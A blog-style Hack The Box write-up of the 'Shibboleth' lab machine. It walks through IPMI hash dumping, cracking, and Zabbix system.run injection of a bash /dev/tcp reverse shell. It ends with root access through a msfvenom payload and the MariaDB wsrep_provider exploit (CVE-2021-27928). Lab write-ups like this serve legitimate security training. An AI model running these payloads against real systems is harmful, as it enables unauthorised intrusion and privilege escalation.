<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack The Box - Shibboleth" /><meta name="author" content="Bhaskar Pal" /><meta property="og:locale" content="en" /><meta name="description" content="Cyber security, Red Teaming and CTF Writeup’s" /><meta property="og:description" content="Cyber security, Red Teaming and CTF Writeup’s" /><link rel="canonical" href="https://0xstarlight.github.io/posts/HTB-Shibboleth/" /><meta property="og:url" content="https://0xstarlight.github.io/posts/HTB-Shibboleth/" /><meta property="og:site_name" content="0xStarlight" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-05T08:47:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Shibboleth" /><meta name="twitter:site" content="@Bhaskarpal__" /><meta name="twitter:creator" content="@Bhaskar Pal" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Bhaskar Pal"},"dateModified":"2022-04-28T11:57:08+05:30","datePublished":"2022-04-05T08:47:00+05:30","description":"Cyber security, Red Teaming and CTF Writeup’s","headline":"Hack The Box - Shibboleth","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xstarlight.github.io/posts/HTB-Shibboleth/"},"url":"https://0xstarlight.github.io/posts/HTB-Shibboleth/"}</script><title>Hack The Box - Shibboleth | 0xStarlight</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="0xStarlight"><meta name="application-name" content="0xStarlight"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://avatars.githubusercontent.com/u/59029171 " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">0xStarlight</a></div><div class="site-subtitle font-italic">Cyber security, Red Teaming and CTF Writeup's</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/0xStarlight" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Bhaskarpal__" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['Bhaskarpal347','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hack The Box - Shibboleth</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Shibboleth</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/Bhaskarpal__">Bhaskar Pal</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1649128620" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-04-05 </em> </span> <span> Updated <em class="timeago" data-ts="1651127228" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-04-28 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1385 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="https://user-images.githubusercontent.com/59029171/161530966-daeb8423-af16-4b35-969a-92301924c330.png" alt="image" data-proofer-ignore></p><p><strong>Shibboleth is about enumerating the UDP ports through which we can find IPMI service is running. We can dump the administrator hashes and log in to one of Shibboleth’s subdomains, where we can get RCE and an initial shell as Zabbix. With password reuse, we can move laterally to ipmi-svc. To root the box, it’s a simple RCE on an outdated version of MySQL.</strong></p><hr /><h1 id="recon"><span style="color:lightblue">Recon</span></h1><h2 id="nmap"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Nmap</span></span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The first thing that I do is run nmap scan enumerating tcp and udp that show this results :</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="gp">0xStarlight@kali$</span><span class="w"> </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> 10.10.11.124 <span class="nt">-vv</span> <span class="o">&gt;</span> nmap_tcp_scan.conf
<span class="gp">0xStarlight@kali$</span><span class="w"> </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-sU</span> <span class="nt">-Pn</span> 10.10.11.124 <span class="nt">-vv</span> <span class="o">&gt;</span> nmap_udp_scan.conf
<span class="gp">0xStarlight@kali$</span><span class="w"> </span><span class="nb">cat </span>nmap_tcp_scan.conf nmap_udp_scan.conf
<span class="go">
[SNIP...]
PORT   STATE SERVICE    REASON  VERSION
80/tcp open  tcpwrapped syn-ack
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
|
PORT    STATE SERVICE  VERSION
623/udp open  asf-rmcp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port623-UDP:V=7.91%I=7%D=1/15%Time=61E2A6CF%P=x86_64-pc-linux-gnu%r(ipm
SF:i-rmcp,1E,"\x06\0\xff\x07\0\0\0\0\0\0\0\0\0\x10\x81\x1cc\x20\x008\0\x01
</span><span class="gp">SF:\x97\x04\x03\0\0\0\0\t");</span><span class="w">
</span></pre></table></code></div></div><p>From the Nmap results, we can see that there is port 80, which is a web service apache 2.4.41, is running on the server with a hostname of <code class="language-plaintext highlighter-rouge">shibboleth.htb</code>. So we can add it to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p><p>On port 623, we can see the asf-rmcp service running. UDP IPMI service on port 623 is a quick way of discovering BMCs on the network.</p><h2 id="shibbolethhtb---tcp-80"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">shibboleth.htb - TCP 80</span></span><a href="#shibbolethhtb---tcp-80" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Upon visiting the site, it seems to be made out of bootstrap. It has a few pages visible on the top. There is also a contact form which returns an error when submitted.</p><p><img data-src="https://user-images.githubusercontent.com/59029171/161533352-6cf65210-7241-4bd6-8441-0fcd226151a0.png" alt="image" data-proofer-ignore></p><p>I tried feroxbuster, but no interesting page was returned to me. At the bottom of the page, we can view how the server is hosted.</p><p><em>Powered by enterprise monitoring solutions based on Zabbix and Bare Metal BMC automation.</em></p><p>Doing a lot of research on Bare Metal BMC displays many references about IPMI.</p><p><img data-src="https://user-images.githubusercontent.com/59029171/161536444-7a32c197-ca8d-4ad5-a65b-8ab94a351ed2.png" alt="image" data-proofer-ignore></p><h2 id="subdomain-fuzzing"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Subdomain Fuzzing</span></span><a href="#subdomain-fuzzing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The next thing I tried was subdomain fuzzing using <code class="language-plaintext highlighter-rouge">ffuf</code>. I’ll start the scan and immediately kill it, then use the <code class="language-plaintext highlighter-rouge">-fw</code> tag to hide all the pages redirecting me to status 302 with word 18.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="gp">0xStarlight@kali$</span><span class="w"> </span>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <span class="nt">-u</span> http://shibboleth.htb/ <span class="nt">-H</span> <span class="s2">"Host: FUZZ.shibboleth.htb"</span> <span class="nt">-fw</span> 18                        
<span class="go">
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://shibboleth.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.shibboleth.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 18
________________________________________________

monitor                 [Status: 200, Size: 3684, Words: 192, Lines: 30]
monitoring              [Status: 200, Size: 3684, Words: 192, Lines: 30]
zabbix                  [Status: 200, Size: 3684, Words: 192, Lines: 30]
</span></pre></table></code></div></div><p>I’ll add each of those to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as well:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">10.10.11.124 shibboleth.htb monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htb
</span></pre></table></code></div></div><h2 id="monitorshibbolethhtb---tcp-80"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">monitor.shibboleth.htb - TCP 80</span></span><a href="#monitorshibbolethhtb---tcp-80" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We can see ZABBIX is running on this subdomain upon visiting the site. At the bottom, we can see the copyright till 2021. So this means we could be an outdated service abuse. Since we saw from <code class="language-plaintext highlighter-rouge">shibboleth.htb</code> is powered by Bare Metal BMC automation, there could be a chance that we could abuse IMPI to get a valid login credential to log in.</p><p><img data-src="https://user-images.githubusercontent.com/59029171/161535439-83b7e2c0-611c-42e1-8c30-01bd6e6ac912.png" alt="image" data-proofer-ignore></p><h2 id="impi---udp-623"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">IMPI - UDP 623</span></span><a href="#impi---udp-623" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>One of the <a href="http://www.staroceans.org/e-book/IPMI-hack.htm">blogs</a>, I read while researching stated that <em>Most BMCs expose some form of web-based management, a command-line interface such as Telnet or Secure Shell, and the IPMI network protocol on port 623 (UDP and sometimes TCP).</em></p><p>The article on <a href="https://book.hacktricks.xyz/pentesting/623-udp-ipmi">Hacktricks</a> demonstrated the exploitation of IMPI and dumping of the users hashes.</p><p>Basically, you can ask the server for the hashes MD5 and SHA1 of any username and if the username exists those hashes will be sent back. Yeah, as amazing as it sounds. And there is a metasploit module for testing this.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">msf &gt;</span><span class="w"> </span>use auxiliary/scanner/ipmi/ipmi_dumphashes
<span class="gp">msf &gt;</span><span class="w"> </span><span class="nb">set </span>rhosts 10.10.11.124
<span class="gp">msf &gt;</span><span class="w"> </span>exploit
<span class="go">
[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:2b68c64d82280000a8c1a7e2d84aba3e0410df33d1bf8d7f39a69fefdb2a49b26877364dbe132618a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:b2726f78047e0ccb5324cb8a4701686d29ad00a5
</span></pre></table></code></div></div><p>Now we have the administrators hash. we can crack the hash using hashcat and try to login using the found credentials.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">0xStarlight@kali$</span><span class="w"> </span>hashcat <span class="nt">-m</span> 7300 <span class="nb">hash</span> /home/kali/rockyou.txt
<span class="go">
password : ilovepumkinpie1
</span></pre></table></code></div></div><h1 id="shell-as-zabbix"><span style="color:lightblue">Shell as Zabbix</span></h1><p>Great, now we have Administrator user valid credentials.</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left">Useraname<th style="text-align: left">Password<tbody><tr><td style="text-align: left">Administrator<td style="text-align: left">ilovepumkinpie1</table></div><p>We can go back to <code class="language-plaintext highlighter-rouge">monitor.shibboleth.htb</code> and log in as Administrator.</p><p><img data-src="https://user-images.githubusercontent.com/59029171/161680107-abf2c7d5-b3dd-4dc2-953a-f955394ca908.png" alt="image" data-proofer-ignore></p><p>The end of the dashboard page displays the version of Zabbix, i.e., Zabbix 5.0.17. © 2001–2021, Zabbix SIA. I tried to google if there were any documents or any pre available exploits for the version Zabbix is running on.</p><p>After a lot of digging, I couldn’t find any pre available exploits for abusing Zabbix 5.0.17. Still, on reading the <a href="https://www.zabbix.com/documentation/current/en/manual/config/items/itemtypes/zabbix_agent">documentation</a> of the Zabbix agent, the system data command mentioned that it was possible for command execution using the <code class="language-plaintext highlighter-rouge">system.run[command,&lt;mode&gt;]</code> function.</p><p><img data-src="https://user-images.githubusercontent.com/59029171/161682238-2d6c404e-b589-4aae-bbd4-031379d77361.png" alt="image" data-proofer-ignore></p><p>Let’s try it out. First, set a listener on our machine.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">0xStarlight@kali$</span><span class="w"> </span><span class="nb">sudo </span>rlwrap nc <span class="nt">-lnvp</span> 8888
</pre></table></code></div></div><p>Navigate to the following –&gt; Configurations &gt; Host &gt; Items &gt; create item</p><p>We can inject our payload for a reverse shell into the <em>key value</em> and then test the value to execute the command.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>system.run[/bin/bash <span class="nt">-c</span> <span class="s2">"/bin/bash -i &gt;&amp; /dev/tcp/10.10.x.x/8888 0&gt;&amp;1"</span>,nowait]
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/161682689-f6932519-3397-414a-8e62-55bcf575b02f.png" alt="image" data-proofer-ignore></p><h1 id="shell-as-ipmi-svc"><span style="color:lightblue">Shell as ipmi-svc</span></h1><p>After receiving a reverse shell from Zabbix, we can make it into a stable shell to work on it more efficiently.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">zabbix@shibboleth:/$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
</pre></table></code></div></div><p>I identified another user on the machine, <code class="language-plaintext highlighter-rouge">ipmi-svc</code>. Since we already have a credential found, we can try to use that to elevate to that user.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">zabbix@shibboleth:/$</span><span class="w"> </span>su ipmi-svc
<span class="go">password : ilovepumkinpie1

</span><span class="gp">ipmi-svc@shibboleth:/$</span><span class="w"> </span><span class="nb">whoami</span><span class="p">;</span><span class="nb">id</span>
<span class="go">ipmi-svc
uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)
</span></pre></table></code></div></div><h2 id="enumeration"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Enumeration</span></span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The first thing I checked was Zabbix config file stored as <code class="language-plaintext highlighter-rouge">/etc/zabbix/</code> to check if there would be any other user’s credentials hardcoded into it, which we may use for privilege escalation.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">ipmi-svc@shibboleth:/$</span><span class="w"> </span><span class="nb">grep</span> <span class="nt">-iR</span> <span class="s1">'password'</span> /etc/zabbix/ 2&gt;/dev/null
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/161683794-d727abb8-fc5a-4f23-86ab-be025cbbfda0.png" alt="image" data-proofer-ignore></p><p>Further reading the file, we can find the username and the password to access Zabbix’s database server.</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left">Useraname<th style="text-align: left">DBUser<th style="text-align: left">DBPassword<tbody><tr><td style="text-align: left">zabbix<td style="text-align: left">zabbix<td style="text-align: left">bloooarskybluh</table></div><p>I also ran linpeas on another shell to check if it returned anything interesting. It displayed MySQL is running on the machine on port 3306.</p><p><img data-src="https://user-images.githubusercontent.com/59029171/161684262-238df92d-e8f2-4f3d-ba0a-67db3c2a24b5.png" alt="image" data-proofer-ignore></p><h1 id="shell-as-root"><span style="color:lightblue">Shell as Root</span></h1><p>We can log in to the MYSQL databases server with the above credential.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="gp">ipmi-svc@shibboleth:/$</span><span class="w"> </span>mysql <span class="nt">-u</span> zabbix <span class="nt">-p</span> <span class="nt">-D</span> zabbix
<span class="go">password : bloooarskybluh

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

</span><span class="gp">Welcome to the MariaDB monitor.  Commands end with ;</span><span class="w"> </span>or <span class="se">\g</span><span class="nb">.</span>
<span class="go">Your MariaDB connection id is 17592
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

</span><span class="gp">Type 'help;</span><span class="s1">' or '</span><span class="se">\h</span><span class="s1">' for help. Type '</span><span class="se">\c</span><span class="s1">' to clear the current input statement.
</span><span class="go">
</span><span class="gp">MariaDB [zabbix]&gt;</span><span class="w"> 
</span></pre></table></code></div></div><p>On reading the server version, it’s currently running on MariaDB 10.3.25, an older version of MariaDB. Doing a quick google search, I found out it was vulnerable to remote code execution, which would give us privileged access as root user using <a href="https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html">CVE-2021-27928</a>.</p><p>Using the CVE we can craft our payload and get root access.</p><h2 id="local-machine"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Local Machine</span></span><a href="#local-machine" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Create the reverse shell payload and start the listener.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">0xStarlight@kali$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.x.x <span class="nv">LPORT</span><span class="o">=</span>9999 <span class="nt">-f</span> elf-so <span class="nt">-o</span> shell.so
<span class="gp">0xStarlight@kali$</span><span class="w"> </span><span class="nb">sudo </span>rlwrap nc <span class="nt">-lnvp</span> 9999
</pre></table></code></div></div><p>We can start a python server so we can transfer the file on ipmi-svc using wget.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">0xStarlight@kali$</span><span class="w"> </span>python3 <span class="nt">-m</span> http.server 80
</pre></table></code></div></div><h2 id="ipmi-svc-machine"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">ipmi-svc Machine</span></span><a href="#ipmi-svc-machine" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Transfer the file, execute the payload and check on the listening listener to get a shell as root.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">ipmi-svc@shibboleth:/$</span><span class="w"> </span>wget http://10.10.x.x/shell.so <span class="nt">-o</span> /tmp/shell.so
<span class="gp">ipmi-svc@shibboleth:/$</span><span class="w"> </span>mysql <span class="nt">-u</span> zabbix <span class="nt">-p</span> <span class="nt">-D</span> zabbix <span class="nt">-e</span> <span class="s1">'SET GLOBAL wsrep_provider="/tmp/shell.so";'</span>
<span class="go">password : bloooarskybluh
</span></pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/161686612-2a4d8f9f-2ea2-4711-ada7-538281026b4c.png" alt="image" data-proofer-ignore></p><h1 id="box-rooted"><span style="color:lightblue">Box Rooted</span></h1><p><img data-src="https://user-images.githubusercontent.com/59029171/161686774-cd12e45c-5bc3-4bc2-8c3d-b253dd05752f.png" alt="image" data-proofer-ignore></p><p>HTB Profile : <a href="https://app.hackthebox.com/profile/244565">0xStarlight</a></p><p>If you find my articles interesting, you can buy me a coffee</p><p><a href="https://www.buymeacoffee.com/0xStarlight"><img data-src="https://img.buymeacoffee.com/button-api/?text=Buy me an OSCP?&amp;emoji=&amp;slug=0xStarlight&amp;button_colour=b86e19&amp;font_colour=ffffff&amp;font_family=Poppins&amp;outline_colour=ffffff&amp;coffee_colour=FFDD00" data-proofer-ignore></a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/hackthebox-linux/'>Hackthebox-Linux</a>, <a href='/categories/hackthebox-medium/'>Hackthebox-Medium</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/network/" class="post-tag no-text-decoration" >network</a> <a href="/tags/mariadb/" class="post-tag no-text-decoration" >MariaDB</a> <a href="/tags/password-reuse/" class="post-tag no-text-decoration" >password-reuse</a> <a href="/tags/internal/" class="post-tag no-text-decoration" >Internal</a> <a href="/tags/ipmi/" class="post-tag no-text-decoration" >IPMI</a> <a href="/tags/cve-exploitation/" class="post-tag no-text-decoration" >CVE-Exploitation</a> <a href="/tags/cve-2021-27928/" class="post-tag no-text-decoration" >CVE-2021-27928</a> <a href="/tags/weak-credentials/" class="post-tag no-text-decoration" >Weak-Credentials</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Shibboleth - 0xStarlight&amp;url=https://0xstarlight.github.io/posts/HTB-Shibboleth/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Shibboleth - 0xStarlight&amp;u=https://0xstarlight.github.io/posts/HTB-Shibboleth/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://0xstarlight.github.io/posts/HTB-Shibboleth/&amp;text=Hack The Box - Shibboleth - 0xStarlight" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Active-Directory-Domain-Persistence/">Active Directory - Domain 